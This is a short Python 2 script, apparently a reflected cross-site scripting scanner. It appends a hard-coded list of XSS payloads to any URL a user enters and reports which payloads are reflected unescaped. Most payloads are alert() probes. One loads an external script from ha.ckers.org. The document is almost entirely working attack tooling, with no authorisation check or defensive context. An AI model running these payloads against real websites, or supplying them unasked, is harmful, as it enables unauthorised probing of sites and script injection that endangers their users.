import requests
from pprint import pprint
payloads = ["<svg/onload=alert(/RUTHLESS/)>", "<img src='aaa'onerror=alert(/@_t0x1c/)>", "<!'/*!'/*!//'/*//'/*--!><Input/Autofocus/%0D*/Onfocus=confirm'1'//><Svg>", "</style></scRipt><scRipt>alert('OPENBUGBOUNTY')</scRipt>", "<sCriPt>alert(1);</sCriPt>", "<script>alert(1)</script>", "<script src=http://ha.ckers.org/xss.js></script>", "'><script>alert(1)</script>", "\"><img src=\"blah.jpg\" onerror=\"alert('XSS')\"/>", "\"><script>alert(1)</script>", "\"\/><img src=\"blahjpg\" onerror=\"alert('XSS')\"/>", "\"\/><img src=\"blah.jpg\" onerror=\"alert('XSS')\"/>", "\"/><script>alert(1)</script>", "<img src=\"blah.jpg\" onerror=\"alert('XSS')\"/>", "<IMG \"\"\"><script>alert(\"XSS\")</script>\">", "<script>alert(String.fromCharCode(88,83,83));</script>"]
url = raw_input("URL: ")
vuln = []
for payload in payloads:
    payload = payload
    xss_url = url+payload
    r = requests.get(xss_url)
    if payload.lower() in r.text.lower():
        print("Vulnerable: " + payload)
        if(payload not in vuln):
            vuln.append(payload)
    else:
        print "Not vulnerable!"

print "--------------------\nAvailable Payloads:"
print '\n'.join(vuln)
